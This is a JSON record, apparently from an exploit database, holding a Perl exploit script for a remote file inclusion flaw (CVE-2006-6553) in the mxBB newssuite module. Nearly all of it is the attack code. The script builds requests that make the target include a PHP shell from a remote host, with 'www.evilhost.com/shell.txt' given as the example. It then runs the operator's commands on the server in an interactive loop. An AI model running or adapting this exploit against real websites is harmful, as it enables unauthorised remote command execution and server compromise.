{
  "id": "2925",
  "title": "mxBB Module newssuite 1.03 - Remote File Inclusion",
  "cve": "CVE-2006-6553",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n#mxBB newssuite Module v1.5  --Remote File Inclusion Exploit\r\n#Bug Found & Exploit [c]oded By Dr Max Virus\r\n#Download:http://www.mx-system.com/modules/mx_pafiledb/dload.php?action=download&file_id=17\r\n\r\n#PoC: http://[target]/mxBB/modules/mx_newssuite/includes/newssuite_constants.php?mx_root_path=[shell]\r\n\r\n\r\nuse LWP::UserAgent;\r\n\r\n$target=@ARGV[0];\r\n$shellsite=@ARGV[1];\r\n$cmdv=@ARGV[2];\r\n\r\nif($target!~/http:\\/\\// || $shellsite!~/http:\\/\\// || !$cmdv)\r\n{\r\n\tusg()\r\n}\r\nheader();\r\n\r\n\r\nwhile()\r\n{\r\nprint \"[Shell] \\$\";\r\nwhile (<STDIN>)\r\n{\r\n\t$cmd=$_;\r\n\tchomp($cmd);\r\n\t\r\n$xpl = LWP::UserAgent->new() or die;\r\n$req = HTTP::Request->new(GET=>$target.'/includes/newssuite_constants.php?mx_root_path='.$shellsite='.?&'.$cmdv.'='.$cmd)or die \"\\n\\n Failed to Connect, Try again!\\n\";  \r\n$res = $xpl->request($req);\r\n$info = $res->content;\r\n$info =~ tr/[\\n]/[&#234;]/;\r\n\r\n \r\nif (!$cmd) {\r\nprint \"\\nEnter a Command\\n\\n\"; $info =\"\";\r\n}\r\n\r\n\r\nelsif ($info =~/failed to open stream: HTTP request failed!/ || $info =~/: Cannot execute a blank command in <b>/)\r\n{\r\nprint \"\\nCould Not Connect to cmd Host or Invalid Command Variable\\n\";\r\nexit;\r\n}\r\n\r\n\r\nelsif ($info =~/^<br.\\/>.<b>Warning/) {\r\nprint \"\\nInvalid Command\\n\\n\";\r\n};\r\n\r\n\r\nif($info =~ /(.+)<br.\\/>.<b>Warning.(.+)<br.\\/>.<b>Warning/)\r\n{\r\n$final = $1;\r\n$final=~ tr/[&#234;]/[\\n]/;\r\nprint \"\\n$final\\n\";\r\nlast;\r\n}\r\n\r\nelse {\r\nprint \"[shell] \\$\";\r\n} \r\n}\r\n}\r\nlast;\r\n\r\n\r\n\r\nsub header()\r\n{\r\nprint q{\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\nmxBB newssuite Module v1.5  -- Remote File  Include Exploit\r\n      \r\nVulnerablity found by: Dr Max Virus\r\n      \r\nExploit [c]oded by: Dr Max Virus        \r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n}\r\n}\r\nsub usg()\r\n{\r\nheader();\r\nprint q{\r\nUsage:  exploit.pl <fullpath> <Shell Location> <Shell Cmd>\r\n<FULL PATH> - Path to site exp. www.site.com\r\n<shell Location> - Path to shell exp. www.evilhost.com/shell.txt\r\n<shell Cmd Variable> - Command variable for php shell exp. id\r\nExample:  exploit.pl http://www.site.com/[path]/\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n};\r\n\r\nexit();\r\n}\r\n\r\n# milw0rm.com [2006-12-12]",
  "url": "https://www.exploit-db.com/exploits/2925"
}